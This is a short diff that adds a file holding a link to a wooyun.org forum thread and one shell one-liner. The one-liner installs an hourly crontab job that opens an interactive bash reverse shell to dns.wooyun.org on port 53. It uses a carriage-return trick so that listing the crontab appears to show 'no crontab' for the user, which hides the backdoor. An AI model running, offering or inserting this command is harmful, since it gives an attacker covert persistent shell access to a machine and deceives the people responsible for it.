@@ -1,0 +1,5 @@
+http://zone.wooyun.org/content/18244
+
+
+
+(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/dns.wooyun.org/53;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -
